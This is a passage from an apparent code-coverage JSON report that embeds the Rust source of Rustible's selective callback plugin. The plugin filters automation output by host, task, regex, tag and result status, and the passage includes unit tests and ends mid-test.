":{"Line":1}},{"line":762,"address":[31998743],"length":1,"stats":{"Line":1}},{"line":763,"address":[31998748],"length":1,"stats":{"Line":1}},{"line":767,"address":[],"length":0,"stats":{"Line":0}},{"line":768,"address":[],"length":0,"stats":{"Line":0}},{"line":769,"address":[],"length":0,"stats":{"Line":0}},{"line":773,"address":[],"length":0,"stats":{"Line":0}},{"line":774,"address":[],"length":0,"stats":{"Line":0}},{"line":775,"address":[],"length":0,"stats":{"Line":0}},{"line":779,"address":[],"length":0,"stats":{"Line":0}},{"line":780,"address":[],"length":0,"stats":{"Line":0}},{"line":781,"address":[],"length":0,"stats":{"Line":0}},{"line":785,"address":[31998400],"length":1,"stats":{"Line":1}},{"line":786,"address":[31998417],"length":1,"stats":{"Line":1}},{"line":787,"address":[31998421],"length":1,"stats":{"Line":1}},{"line":791,"address":[31998496],"length":1,"stats":{"Line":1}},{"line":792,"address":[31998519],"length":1,"stats":{"Line":1}},{"line":793,"address":[31998524],"length":1,"stats":{"Line":1}},{"line":797,"address":[31998352],"length":1,"stats":{"Line":0}},{"line":798,"address":[31998375],"length":1,"stats":{"Line":0}},{"line":799,"address":[31998380],"length":1,"stats":{"Line":0}},{"line":803,"address":[31998672],"length":1,"stats":{"Line":0}},{"line":804,"address":[31998695],"length":1,"stats":{"Line":0}},{"line":805,"address":[31998700],"length":1,"stats":{"Line":0}},{"line":809,"address":[31998448],"length":1,"stats":{"Line":1}},{"line":810,"address":[31998465],"length":1,"stats":{"Line":1}},{"line":811,"address":[31998469],"length":1,"stats":{"Line":1}},{"line":815,"address":[31998608],"length":1,"stats":{"Line":1}},{"line":816,"address":[31998622],"length":1,"stats":{"Line":1}},{"line":821,"address":[31982144],"length":1,"stats":{"Line":0}},{"line":822,"address":[31982152],"length":1,"stats":{"Line":0}}],"covered":189,"coverable":328},{"path":["/","home","artur","Repositories","rustible","src","callback","plugins","selective.rs"],"content":"//! Selective callback plugin for Rustible.\n//!\n//! This plugin provides fine-grained filtering of execution output based on:\n//! - Specific hosts (whitelist/blacklist)\n//! - Specific tasks (whitelist/blacklist)\n//! - Result status (failures only, changed only, etc.)\n//! - Regex patterns for task names\n//! - Tag-based filtering\n//!\n//! # Features\n//!\n//! - Host filtering: Include/exclude specific hosts by name or pattern\n//! - Task filtering: Include/exclude specific tasks by name or regex\n//! - Status filtering: Show only failures, changes, or specific status types\n//! - Tag filtering: Filter tasks by their assigned tags\n//! - Quiet mode: Suppress all output except matching criteria\n//!\n//! # Example Usage\n//!\n//! ```rust,ignore\n//! use rustible::callback::plugins::SelectiveCallback;\n//!\n//! // Show only failures from specific hosts\n//! let callback = SelectiveCallback::builder()\n//!     .hosts(\u0026[\"webserver1\", \"webserver2\"])\n//!     .failures_only()\n//!     .build();\n//!\n//! // Show tasks matching a regex pattern\n//! let callback = SelectiveCallback::builder()\n//!     .task_pattern(r\"(?i)install.*nginx\")\n//!     .build();\n//!\n//! // Filter by tags\n//! let callback = SelectiveCallback::builder()\n//!     .tags(\u0026[\"deploy\", \"config\"])\n//!     .build();\n//! ```\n//!\n//! # Example Output\n//!\n//! ```text\n//! [MATCHED] webserver1 | Install nginx | changed\n//! [MATCHED] webserver2 | Install nginx | failed: Package not found\n//!\n//! SELECTIVE RECAP (filtered 3 of 15 results):\n//! webserver1: matched=2 ok=1 changed=1 failed=0\n//! webserver2: matched=1 ok=0 changed=0 failed=1\n//! ```\n\nuse std::collections::{HashMap, HashSet};\nuse std::sync::Arc;\nuse std::time::Instant;\n\nuse async_trait::async_trait;\nuse colored::Colorize;\nuse parking_lot::RwLock;\nuse regex::Regex;\n\nuse crate::facts::Facts;\nuse crate::traits::{ExecutionCallback, ExecutionResult};\n\n/// Filter mode for host and task matching.\n#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]\npub enum FilterMode {\n    /// Include items that match the filter (whitelist)\n    #[default]\n    Include,\n    /// Exclude items that match the filter (blacklist)\n    Exclude,\n}\n\n/// Status filter configuration.\n#[derive(Debug, Clone, Default)]\npub struct StatusFilter {\n    /// Show only failures\n    pub failures_only: bool,\n    /// Show only changes\n    pub changes_only: bool,\n    /// Show only skipped\n    pub skipped_only: bool,\n    /// Show specific statuses (if empty, show all)\n    pub statuses: HashSet\u003cString\u003e,\n}\n\nimpl StatusFilter {\n    /// Creates a filter that shows only failures.\n    #[must_use]\n    pub fn failures() -\u003e Self {\n        Self {\n            failures_only: true,\n            ..Default::default()\n        }\n    }\n\n    /// Creates a filter that shows only changes.\n    #[must_use]\n    pub fn changes() -\u003e Self {\n        Self {\n            changes_only: true,\n            ..Default::default()\n        }\n    }\n\n    /// Creates a filter that shows specific statuses.\n    #[must_use]\n    pub fn with_statuses(statuses: \u0026[\u0026str]) -\u003e Self {\n        Self {\n            statuses: statuses.iter().map(|s| s.to_string()).collect(),\n            ..Default::default()\n        }\n    }\n\n    /// Check if a result matches this status filter.\n    fn matches(\u0026self, result: \u0026ExecutionResult) -\u003e bool {\n        // If failures_only is set, only match failures\n        if self.failures_only \u0026\u0026 result.result.success {\n            return false;\n        }\n\n        // If changes_only is set, only match changes\n        if self.changes_only \u0026\u0026 !result.result.changed {\n            return false;\n        }\n\n        // If skipped_only is set, only match skipped\n        if self.skipped_only \u0026\u0026 !result.result.skipped {\n            return false;\n        }\n\n        // If specific statuses are set, check if the status matches\n        if !self.statuses.is_empty() {\n            let status = Self::result_to_status_str(result);\n            if !self.statuses.contains(status) {\n                return false;\n            }\n        }\n\n        true\n    }\n\n    /// Convert ExecutionResult to status string for comparison.\n    fn result_to_status_str(result: \u0026ExecutionResult) -\u003e \u0026'static str {\n        if result.result.skipped {\n            \"skipped\"\n        } else if !result.result.success {\n            \"failed\"\n        } else if result.result.changed {\n            \"changed\"\n        } else {\n            \"ok\"\n        }\n    }\n}\n\n/// Configuration for the selective callback.\n#[derive(Debug, Clone, Default)]\npub struct SelectiveConfig {\n    /// Hosts to filter (whitelist or blacklist based on mode)\n    pub hosts: HashSet\u003cString\u003e,\n    /// Host filter mode\n    pub host_mode: FilterMode,\n    /// Host patterns (regex)\n    pub host_patterns: Vec\u003cString\u003e,\n    /// Compiled host regex patterns\n    #[allow(dead_code)]\n    compiled_host_patterns: Vec\u003cRegex\u003e,\n\n    /// Tasks to filter (whitelist or blacklist based on mode)\n    pub tasks: HashSet\u003cString\u003e,\n    /// Task filter mode\n    pub task_mode: FilterMode,\n    /// Task patterns (regex)\n    pub task_patterns: Vec\u003cString\u003e,\n    /// Compiled task regex patterns\n    #[allow(dead_code)]\n    compiled_task_patterns: Vec\u003cRegex\u003e,\n\n    /// Status filter\n    pub status_filter: StatusFilter,\n\n    /// Tags to filter by (tasks must have at least one matching tag)\n    pub tags: HashSet\u003cString\u003e,\n    /// Tag filter mode\n    pub tag_mode: FilterMode,\n\n    /// Whether to show verbose output for matches\n    pub verbose: bool,\n    /// Whether to show the recap even if no matches\n    pub always_recap: bool,\n    /// Custom prefix for matched output\n    pub match_prefix: Option\u003cString\u003e,\n}\n\nimpl SelectiveConfig {\n    /// Compile regex patterns from string patterns.\n    fn compile_patterns(\u0026mut self) {\n        self.compiled_host_patterns = self\n            .host_patterns\n            .iter()\n            .filter_map(|p| Regex::new(p).ok())\n            .collect();\n        self.compiled_task_patterns = self\n            .task_patterns\n            .iter()\n            .filter_map(|p| Regex::new(p).ok())\n            .collect();\n    }\n}\n\n/// Statistics tracked per host during execution.\n#[derive(Debug, Clone, Default)]\nstruct HostStats {\n    /// Count of matched results\n    matched: u32,\n    /// Count of total results\n    total: u32,\n    /// Count of successful tasks (no changes)\n    ok: u32,\n    /// Count of tasks that made changes\n    changed: u32,\n    /// Count of failed tasks\n    failed: u32,\n    /// Count of skipped tasks\n    skipped: u32,\n    /// Count of unreachable attempts\n    unreachable: u32,\n}\n\n/// Selective callback plugin that filters output based on configurable criteria.\n///\n/// This callback allows fine-grained control over which execution results\n/// are displayed, making it easier to focus on specific hosts, tasks, or\n/// failure scenarios.\n///\n/// # Design Principles\n///\n/// 1. **Flexible Filtering**: Multiple filter types can be combined\n/// 2. **Pattern Matching**: Regex support for host and task names\n/// 3. **Tag Support**: Filter by task tags for organized output\n/// 4. **Clear Output**: Matched results are clearly indicated\n/// 5. **Filtered Recap**: Summary shows filter statistics\n///\n/// # Usage\n///\n/// ```rust,ignore\n/// use rustible::callback::plugins::{SelectiveCallback, SelectiveBuilder};\n///\n/// let callback = SelectiveCallback::builder()\n///     .hosts(\u0026[\"prod-web-*\"])\n///     .failures_only()\n///     .verbose()\n///     .build();\n///\n/// executor.with_callback(Box::new(callback));\n/// ```\n#[derive(Debug)]\npub struct SelectiveCallback {\n    /// Configuration for filtering\n    config: SelectiveConfig,\n    /// Compiled host regex patterns\n    host_patterns: Vec\u003cRegex\u003e,\n    /// Compiled task regex patterns\n    task_patterns: Vec\u003cRegex\u003e,\n    /// Per-host execution statistics\n    host_stats: Arc\u003cRwLock\u003cHashMap\u003cString, HostStats\u003e\u003e\u003e,\n    /// Playbook start time for duration tracking\n    start_time: Arc\u003cRwLock\u003cOption\u003cInstant\u003e\u003e\u003e,\n    /// Current playbook name\n    playbook_name: Arc\u003cRwLock\u003cOption\u003cString\u003e\u003e\u003e,\n    /// Whether any failures occurred (for exit code)\n    has_failures: Arc\u003cRwLock\u003cbool\u003e\u003e,\n    /// Task tags cache (task_name -\u003e tags)\n    task_tags: Arc\u003cRwLock\u003cHashMap\u003cString, Vec\u003cString\u003e\u003e\u003e\u003e,\n    /// Count of matched results\n    match_count: Arc\u003cRwLock\u003cu32\u003e\u003e,\n    /// Count of total results\n    total_count: Arc\u003cRwLock\u003cu32\u003e\u003e,\n}\n\nimpl SelectiveCallback {\n    /// Creates a new selective callback with the given configuration.\n    #[must_use]\n    pub fn new(mut config: SelectiveConfig) -\u003e Self {\n        config.compile_patterns();\n\n        let host_patterns: Vec\u003cRegex\u003e = config\n            .host_patterns\n            .iter()\n            .filter_map(|p| Regex::new(p).ok())\n            .collect();\n\n        let task_patterns: Vec\u003cRegex\u003e = config\n            .task_patterns\n            .iter()\n            .filter_map(|p| Regex::new(p).ok())\n            .collect();\n\n        Self {\n            config,\n            host_patterns,\n            task_patterns,\n            host_stats: Arc::new(RwLock::new(HashMap::new())),\n            start_time: Arc::new(RwLock::new(None)),\n            playbook_name: Arc::new(RwLock::new(None)),\n            has_failures: Arc::new(RwLock::new(false)),\n            task_tags: Arc::new(RwLock::new(HashMap::new())),\n            match_count: Arc::new(RwLock::new(0)),\n            total_count: Arc::new(RwLock::new(0)),\n        }\n    }\n\n    /// Creates a new builder for configuring the callback.\n    #[must_use]\n    pub fn builder() -\u003e SelectiveBuilder {\n        SelectiveBuilder::new()\n    }\n\n    /// Creates a callback that only shows failures.\n    #[must_use]\n    pub fn failures_only() -\u003e Self {\n        Self::builder().failures_only().build()\n    }\n\n    /// Creates a callback that only shows changes.\n    #[must_use]\n    pub fn changes_only() -\u003e Self {\n        Self::builder().changes_only().build()\n    }\n\n    /// Creates a callback that filters by specific hosts.\n    #[must_use]\n    pub fn for_hosts(hosts: \u0026[\u0026str]) -\u003e Self {\n        Self::builder().hosts(hosts).build()\n    }\n\n    /// Creates a callback that filters by task name pattern.\n    #[must_use]\n    pub fn for_task_pattern(pattern: \u0026str) -\u003e Self {\n        Self::builder()\n            .task_pattern(pattern)\n            .unwrap_or_else(|_| SelectiveBuilder::new())\n            .build()\n    }\n\n    /// Returns whether any failures occurred during execution.\n    pub fn has_failures(\u0026self) -\u003e bool {\n        *self.has_failures.read()\n    }\n\n    /// Returns the match statistics.\n    pub fn match_stats(\u0026self) -\u003e (u32, u32) {\n        let matched = *self.match_count.read();\n        let total = *self.total_count.read();\n        (matched, total)\n    }\n\n    /// Register task tags for later filtering.\n    pub fn register_task_tags(\u0026self, task_name: \u0026str, tags: Vec\u003cString\u003e) {\n        let mut task_tags = self.task_tags.write();\n        task_tags.insert(task_name.to_string(), tags);\n    }\n\n    /// Check if a host matches the filter criteria.\n    fn host_matches(\u0026self, host: \u0026str) -\u003e bool {\n        // Check explicit host list\n        let in_list = self.config.hosts.contains(host);\n\n        // Check host patterns\n        let pattern_match = self.host_patterns.iter().any(|p| p.is_match(host));\n\n        let matches = in_list || pattern_match;\n\n        // If no filters are set, match all\n        if self.config.hosts.is_empty() \u0026\u0026 self.host_patterns.is_empty() {\n            return true;\n        }\n\n        // Apply filter mode\n        match self.config.host_mode {\n            FilterMode::Include =\u003e matches,\n            FilterMode::Exclude =\u003e !matches,\n        }\n    }\n\n    /// Check if a task matches the filter criteria.\n    fn task_matches(\u0026self, task_name: \u0026str) -\u003e bool {\n        // Check explicit task list\n        let in_list = self.config.tasks.contains(task_name);\n\n        // Check task patterns\n        let pattern_match = self.task_patterns.iter().any(|p| p.is_match(task_name));\n\n        let matches = in_list || pattern_match;\n\n        // If no filters are set, match all\n        if self.config.tasks.is_empty() \u0026\u0026 self.task_patterns.is_empty() {\n            return true;\n        }\n\n        // Apply filter mode\n        match self.config.task_mode {\n            FilterMode::Include =\u003e matches,\n            FilterMode::Exclude =\u003e !matches,\n        }\n    }\n\n    /// Check if task tags match the filter criteria.\n    fn tags_match(\u0026self, task_name: \u0026str) -\u003e bool {\n        // If no tag filters are set, match all\n        if self.config.tags.is_empty() {\n            return true;\n        }\n\n        let task_tags = self.task_tags.read();\n        let tags = task_tags.get(task_name);\n\n        let has_matching_tag = tags.map_or(false, |task_tags| {\n            task_tags.iter().any(|t| self.config.tags.contains(t))\n        });\n\n        // Apply filter mode\n        match self.config.tag_mode {\n            FilterMode::Include =\u003e has_matching_tag,\n            FilterMode::Exclude =\u003e !has_matching_tag,\n        }\n    }\n\n    /// Check if a result matches all filter criteria.\n    fn result_matches(\u0026self, result: \u0026ExecutionResult) -\u003e bool {\n        // Check host filter\n        if !self.host_matches(\u0026result.host) {\n            return false;\n        }\n\n        // Check task filter\n        if !self.task_matches(\u0026result.task_name) {\n            return false;\n        }\n\n        // Check tag filter\n        if !self.tags_match(\u0026result.task_name) {\n            return false;\n        }\n\n        // Check status filter\n        if !self.config.status_filter.matches(result) {\n            return false;\n        }\n\n        true\n    }\n\n    /// Format a matched result for output.\n    fn format_match(\u0026self, result: \u0026ExecutionResult) -\u003e String {\n        let prefix = self.config.match_prefix.as_deref().unwrap_or(\"[MATCHED]\");\n\n        let status_str = if result.result.skipped {\n            \"skipped\".cyan()\n        } else if !result.result.success {\n            \"failed\".red().bold()\n        } else if result.result.changed {\n            \"changed\".yellow()\n        } else {\n            \"ok\".green()\n        };\n\n        let base = format!(\n            \"{} {} | {} | {}\",\n            prefix.bright_magenta().bold(),\n            result.host.bright_white().bold(),\n            result.task_name.bright_cyan(),\n            status_str\n        );\n\n        if !result.result.success \u0026\u0026 !result.result.message.is_empty() {\n            format!(\"{}: {}\", base, result.result.message)\n        } else {\n            base\n        }\n    }\n\n    /// Format verbose match output with additional details.\n    fn format_verbose_match(\u0026self, result: \u0026ExecutionResult) -\u003e String {\n        let mut output = self.format_match(result);\n\n        if self.config.verbose {\n            output.push_str(\u0026format!(\"\\n  Duration: {:?}\", result.duration));\n\n            if !result.notify.is_empty() {\n                output.push_str(\u0026format!(\"\\n  Notified: {}\", result.notify.join(\", \")));\n            }\n\n            if let Some(ref data) = result.result.data {\n                if let Ok(formatted) = serde_json::to_string_pretty(data) {\n                    let indented = formatted\n                        .lines()\n                        .map(|l| format!(\"    {}\", l))\n                        .collect::\u003cVec\u003c_\u003e\u003e()\n                        .join(\"\\n\");\n                    output.push_str(\u0026format!(\"\\n  Data:\\n{}\", indented));\n                }\n            }\n        }\n\n        output\n    }\n\n    /// Format the filtered recap line for a host.\n    fn format_recap_line(host: \u0026str, stats: \u0026HostStats) -\u003e String {\n        let host_color = if stats.failed \u003e 0 || stats.unreachable \u003e 0 {\n            host.red().bold()\n        } else if stats.changed \u003e 0 {\n            host.yellow()\n        } else {\n            host.green()\n        };\n\n        format!(\n            \"{}: matched={} ok={} changed={} failed={} skipped={} unreachable={}\",\n            host_color,\n            stats.matched.to_string().bright_magenta(),\n            stats.ok.to_string().green(),\n            stats.changed.to_string().yellow(),\n            stats.failed.to_string().red(),\n            stats.skipped.to_string().cyan(),\n            stats.unreachable.to_string().magenta(),\n        )\n    }\n}\n\nimpl Default for SelectiveCallback {\n    fn default() -\u003e Self {\n        Self::new(SelectiveConfig::default())\n    }\n}\n\nimpl Clone for SelectiveCallback {\n    fn clone(\u0026self) -\u003e Self {\n        Self {\n            config: self.config.clone(),\n            host_patterns: self.host_patterns.clone(),\n            task_patterns: self.task_patterns.clone(),\n            host_stats: Arc::clone(\u0026self.host_stats),\n            start_time: Arc::clone(\u0026self.start_time),\n            playbook_name: Arc::clone(\u0026self.playbook_name),\n            has_failures: Arc::clone(\u0026self.has_failures),\n            task_tags: Arc::clone(\u0026self.task_tags),\n            match_count: Arc::clone(\u0026self.match_count),\n            total_count: Arc::clone(\u0026self.total_count),\n        }\n    }\n}\n\n#[async_trait]\nimpl ExecutionCallback for SelectiveCallback {\n    /// Called when a playbook starts - records start time.\n    async fn on_playbook_start(\u0026self, name: \u0026str) {\n        *self.start_time.write() = Some(Instant::now());\n        *self.playbook_name.write() = Some(name.to_string());\n\n        // Clear stats from any previous run\n        self.host_stats.write().clear();\n        *self.has_failures.write() = false;\n        *self.match_count.write() = 0;\n        *self.total_count.write() = 0;\n\n        // Clear task tags cache\n        self.task_tags.write().clear();\n    }\n\n    /// Called when a playbook ends - prints the filtered recap.\n    async fn on_playbook_end(\u0026self, name: \u0026str, success: bool) {\n        let stats = self.host_stats.read();\n        let start_time = *self.start_time.read();\n        let match_count = *self.match_count.read();\n        let total_count = *self.total_count.read();\n\n        // Skip recap if no matches and always_recap is false\n        if match_count == 0 \u0026\u0026 !self.config.always_recap {\n            return;\n        }\n\n        // Print empty line before recap for visual separation\n        if !stats.is_empty() {\n            println!();\n        }\n\n        // Print selective recap header\n        println!(\n            \"{} (filtered {} of {} results):\",\n            \"SELECTIVE RECAP\".bright_magenta().bold(),\n            match_count.to_string().bright_white(),\n            total_count.to_string().bright_black()\n        );\n\n        // Print recap for each host in sorted order\n        let mut hosts: Vec\u003c_\u003e = stats.keys().collect();\n        hosts.sort();\n\n        for host in hosts {\n            if let Some(host_stats) = stats.get(host) {\n                // Only show hosts with matches unless always_recap is true\n                if host_stats.matched \u003e 0 || self.config.always_recap {\n                    println!(\"{}\", Self::format_recap_line(host, host_stats));\n                }\n            }\n        }\n\n        // Print duration if we have start time\n        if let Some(start) = start_time {\n            let duration = start.elapsed();\n            let status = if success {\n                \"completed\".green()\n            } else {\n                \"failed\".red().bold()\n            };\n\n            println!(\n                \"\\n{} {} in {:.2}s\",\n                name.bright_white().bold(),\n                status,\n                duration.as_secs_f64()\n            );\n        }\n    }\n\n    /// Called when a play starts - initializes host stats.\n    async fn on_play_start(\u0026self, _name: \u0026str, hosts: \u0026[String]) {\n        let mut stats = self.host_stats.write();\n        for host in hosts {\n            stats.entry(host.clone()).or_default();\n        }\n    }\n\n    /// Called when a play ends.\n    async fn on_play_end(\u0026self, _name: \u0026str, _success: bool) {\n        // Silent - recap is shown at playbook end\n    }\n\n    /// Called when a task starts.\n    async fn on_task_start(\u0026self, _name: \u0026str, _host: \u0026str) {\n        // Silent - we only show output on match\n    }\n\n    /// Called when a task completes - shows output only for matches.\n    async fn on_task_complete(\u0026self, result: \u0026ExecutionResult) {\n        // Update total count\n        *self.total_count.write() += 1;\n\n        // Update host stats\n        {\n            let mut stats = self.host_stats.write();\n            let host_stats = stats.entry(result.host.clone()).or_default();\n            host_stats.total += 1;\n\n            // Update status counts\n            if result.result.skipped {\n                host_stats.skipped += 1;\n            } else if !result.result.success {\n                host_stats.failed += 1;\n                *self.has_failures.write() = true;\n            } else if result.result.changed {\n                host_stats.changed += 1;\n            } else {\n                host_stats.ok += 1;\n            }\n        }\n\n        // Check if result matches filter criteria\n        if self.result_matches(result) {\n            // Update match counts\n            *self.match_count.write() += 1;\n\n            {\n                let mut stats = self.host_stats.write();\n                let host_stats = stats.entry(result.host.clone()).or_default();\n                host_stats.matched += 1;\n            }\n\n            // Print matched result\n            if self.config.verbose {\n                println!(\"{}\", self.format_verbose_match(result));\n            } else {\n                println!(\"{}\", self.format_match(result));\n            }\n        }\n    }\n\n    /// Called when a handler is triggered.\n    async fn on_handler_triggered(\u0026self, _name: \u0026str) {\n        // Silent - handlers are internal details\n    }\n\n    /// Called when facts are gathered.\n    async fn on_facts_gathered(\u0026self, _host: \u0026str, _facts: \u0026Facts) {\n        // Silent - fact gathering is internal\n    }\n}\n\n/// Builder for configuring SelectiveCallback.\n#[derive(Debug, Clone, Default)]\npub struct SelectiveBuilder {\n    config: SelectiveConfig,\n}\n\nimpl SelectiveBuilder {\n    /// Creates a new builder with default configuration.\n    #[must_use]\n    pub fn new() -\u003e Self {\n        Self::default()\n    }\n\n    /// Add hosts to the filter list.\n    #[must_use]\n    pub fn hosts(mut self, hosts: \u0026[\u0026str]) -\u003e Self {\n        for host in hosts {\n            self.config.hosts.insert((*host).to_string());\n        }\n        self\n    }\n\n    /// Add a host pattern (regex) to the filter.\n    pub fn host_pattern(mut self, pattern: \u0026str) -\u003e Result\u003cSelf, regex::Error\u003e {\n        // Validate the regex\n        Regex::new(pattern)?;\n        self.config.host_patterns.push(pattern.to_string());\n        Ok(self)\n    }\n\n    /// Set host filter mode to exclude.\n    #[must_use]\n    pub fn exclude_hosts(mut self) -\u003e Self {\n        self.config.host_mode = FilterMode::Exclude;\n        self\n    }\n\n    /// Add tasks to the filter list.\n    #[must_use]\n    pub fn tasks(mut self, tasks: \u0026[\u0026str]) -\u003e Self {\n        for task in tasks {\n            self.config.tasks.insert((*task).to_string());\n        }\n        self\n    }\n\n    /// Add a task pattern (regex) to the filter.\n    pub fn task_pattern(mut self, pattern: \u0026str) -\u003e Result\u003cSelf, regex::Error\u003e {\n        // Validate the regex\n        Regex::new(pattern)?;\n        self.config.task_patterns.push(pattern.to_string());\n        Ok(self)\n    }\n\n    /// Set task filter mode to exclude.\n    #[must_use]\n    pub fn exclude_tasks(mut self) -\u003e Self {\n        self.config.task_mode = FilterMode::Exclude;\n        self\n    }\n\n    /// Filter to show only failures.\n    #[must_use]\n    pub fn failures_only(mut self) -\u003e Self {\n        self.config.status_filter.failures_only = true;\n        self\n    }\n\n    /// Filter to show only changes.\n    #[must_use]\n    pub fn changes_only(mut self) -\u003e Self {\n        self.config.status_filter.changes_only = true;\n        self\n    }\n\n    /// Filter to show only skipped tasks.\n    #[must_use]\n    pub fn skipped_only(mut self) -\u003e Self {\n        self.config.status_filter.skipped_only = true;\n        self\n    }\n\n    /// Filter to show specific statuses.\n    #[must_use]\n    pub fn statuses(mut self, statuses: \u0026[\u0026str]) -\u003e Self {\n        self.config.status_filter.statuses = statuses.iter().map(|s| s.to_string()).collect();\n        self\n    }\n\n    /// Add tags to the filter list.\n    #[must_use]\n    pub fn tags(mut self, tags: \u0026[\u0026str]) -\u003e Self {\n        for tag in tags {\n            self.config.tags.insert((*tag).to_string());\n        }\n        self\n    }\n\n    /// Set tag filter mode to exclude.\n    #[must_use]\n    pub fn exclude_tags(mut self) -\u003e Self {\n        self.config.tag_mode = FilterMode::Exclude;\n        self\n    }\n\n    /// Enable verbose output for matches.\n    #[must_use]\n    pub fn verbose(mut self) -\u003e Self {\n        self.config.verbose = true;\n        self\n    }\n\n    /// Always show recap even if no matches.\n    #[must_use]\n    pub fn always_recap(mut self) -\u003e Self {\n        self.config.always_recap = true;\n        self\n    }\n\n    /// Set a custom prefix for matched output.\n    #[must_use]\n    pub fn match_prefix(mut self, prefix: \u0026str) -\u003e Self {\n        self.config.match_prefix = Some(prefix.to_string());\n        self\n    }\n\n    /// Build the SelectiveCallback with the configured options.\n    #[must_use]\n    pub fn build(self) -\u003e SelectiveCallback {\n        SelectiveCallback::new(self.config)\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use crate::traits::ModuleResult;\n    use std::time::Duration;\n\n    fn create_execution_result(\n        host: \u0026str,\n        task_name: \u0026str,\n        success: bool,\n        changed: bool,\n        skipped: bool,\n        message: \u0026str,\n    ) -\u003e ExecutionResult {\n        ExecutionResult {\n            host: host.to_string(),\n            task_name: task_name.to_string(),\n            result: ModuleResult {\n                success,\n                changed,\n                message: message.to_string(),\n                skipped,\n                data: None,\n                warnings: Vec::new(),\n            },\n            duration: Duration::from_millis(100),\n            notify: Vec::new(),\n        }\n    }\n\n    #[test]\n    fn test_selective_callback_host_filter() {\n        let callback = SelectiveCallback::builder()\n            .hosts(\u0026[\"host1\", \"host2\"])\n            .build();\n\n        assert!(callback.host_matches(\"host1\"));\n        assert!(callback.host_matches(\"host2\"));\n        assert!(!callback.host_matches(\"host3\"));\n    }\n\n    #[test]\n    fn test_selective_callback_host_exclude() {\n        let callback = SelectiveCallback::builder()\n            .hosts(\u0026[\"host1\"])\n            .exclude_hosts()\n            .build();\n\n        assert!(!callback.host_matches(\"host1\"));\n        assert!(callback.host_matches(\"host2\"));\n    }\n\n    #[test]\n    fn test_selective_callback_host_pattern() {\n        let callback = SelectiveCallback::builder()\n            .host_pattern(r\"web-\\d+\")\n            .unwrap()\n            .build();\n\n        assert!(callback.host_matches(\"web-01\"));\n        assert!(callback.host_matches(\"web-99\"));\n        assert!(!callback.host_matches(\"db-01\"));\n    }\n\n    #[test]\n    fn test_selective_callback_task_filter() {\n        let callback = SelectiveCallback::builder()\n            .tasks(\u0026[\"Install nginx\"])\n            .build();\n\n        assert!(callback.task_matches(\"Install nginx\"));\n        assert!(!callback.task_matches(\"Configure nginx\"));\n    }\n\n    #[test]\n    fn test_selective_callback_task_pattern() {\n        let callback = SelectiveCallback::builder()\n            .task_pattern(r\"(?i)install.*nginx\")\n            .unwrap()\n            .build();\n\n        assert!(callback.task_matches(\"Install nginx\"));\n        assert!(callback.task_matches(\"INSTALL Nginx server\"));\n        assert!(!callback.task_matches(\"Configure nginx\"));\n    }\n\n    #[test]\n    fn test_selective_callback_failures_only() {\n        let callback = SelectiveCallback::failures_only();\n\n        let ok_result = create_execution_result(\"host1\", \"task1\", true, false, false, \"ok\");\n        let failed_result = create_execution_result(\"host1\", \"task2\", false, false, false, \"error\");\n\n        assert!(!callback.result_matches(\u0026ok_result));\n        assert!(callback.result_matches(\u0026failed_result));\n    }\n\n    #[test]\n    fn test_selective_callback_changes_only() {\n        let callback = SelectiveCallback::changes_only();\n\n        let ok_result = create_execution_result(\"host1\", \"task1\", true, false, false, \"ok\");\n        let changed_result =\n            create_execution_result(\"host1\", \"task2\", true, true, false, \"changed\");\n\n        assert!(!callback.result_matches(\u0026ok_result));\n        assert!(callback.result_matches(\u0026changed_result));\n    }\n\n    #[test]\n    fn test_selective_callback_tag_filter() {\n        let callback = SelectiveCallback::builder().tags(\u0026[\"deploy\"]).build();\n\n        // Register tags for tasks\n        callback.register_task_tags(\"Install nginx\", vec![\"deploy\".to_string()]);\n        callback.register_task_tags(\"Configure nginx\", vec![\"config\".to_string()]);\n\n        assert!(callback.tags_match(\"Install nginx\"));\n        assert!(!callback.tags_match(\"Configure nginx\"));\n    }\n\n    #[test]\n    fn test_selective_callback_combined_filters() {\n        let callback = SelectiveCallback::builder()\n            .hosts(\u0026[\"host1\"])\n            .failures_only()\n            .build();\n\n        let host1_ok = create_execution_result(\"host1\", \"task1\", true, false, false, \"ok\");\n        let host1_fail = create_execution_result(\"host1\", \"task2\", false, false, false, \"error\");\n        let host2_fail = create_execution_result(\"host2\", \"task1\", false, false, false, \"error\");\n\n        assert!(!callback.result_matches(\u0026host1_ok));\n        assert!(callback.result_matches(\u0026host1_fail));\n        assert!(!callback.result_matches(\u0026host2_fail));\n    }\n\n    #[test]\n    fn test_selective_callback_no_filters_matches_all() {\n        let callback = SelectiveCallback::default();\n\n        let result = create_execution_result(\"any-host\", \"any-task\", true, false, false, \"ok\");\n\n        assert!(callback.result_matches(\u0026result));\n    }\n\n    #[test]\n    fn test_status_filter_matches() {\n        let failures_filter = StatusFilter::failures();\n        let changes_filter = StatusFilter::changes();\n\n        let ok_result = create_execution_result(\"host1\", \"task1\", true, false, false, \"ok\");\n        let changed_result =\n            create_execution_result(\"host1\", \"task2\", true, true, false, \"changed\");\n        let failed_result = create_execution_result(\"host1\", \"task3\", false, false, false, \"error\");\n\n        assert!(!failures_filter.matches(\u0026ok_result));\n        assert!(!failures_filter.matches(\u0026changed_result));\n        assert!(failures_filter.matches(\u0026failed_result));\n\n        assert!(!changes_filter.matches(\u0026ok_result));\n        assert!(changes_filter.matches(\u0026changed_result));\n        assert!(!changes_filter.matches(\u0026failed_result));\n    }\n\n    #[test]\n    fn test_builder_chaining() {\n        let callback = SelectiveCallback::builder()\n            .hosts(\u0026[\"host1\", \"host2\"])\n            .tasks(\u0026[\"task1\"])\n            .failures_only()\n            .verbose()\n            .always_recap()\n            .match_prefix(\"[FILTER]\")\n            .build();\n\n        assert!(callback.config.hosts.contains(\"host1\"));\n        assert!(callback.config.hosts.contains(\"host2\"));\n        assert!(callback.config.tasks.contains(\"task1\"));\n        assert!(callback.config.status_filter.failures_only);\n        assert!(callback.config.verbose);\n        assert!(callback.config.always_recap);\n        assert_eq!(callback.config.match_prefix, Some(\"[FILTER]\".to_string()));\n    }\n\n    #[test]\n    fn test_clone_shares_state() {\n        let callback1 = SelectiveCallback::new(SelectiveConfig::default());\n        let callback2 = callback1.clone();\n\n        // Both should share the same underlying state\n        assert!(Arc::ptr_eq(\u0026callback1.host_stats, \u0026callback2.host_stats));\n        assert!(Arc::ptr_eq(\n            \u0026callback1.has_failures,\n            \u0026callback2.has_failures\n        ));\n        assert!(Arc::ptr_eq(\u0026callback1.match_count, 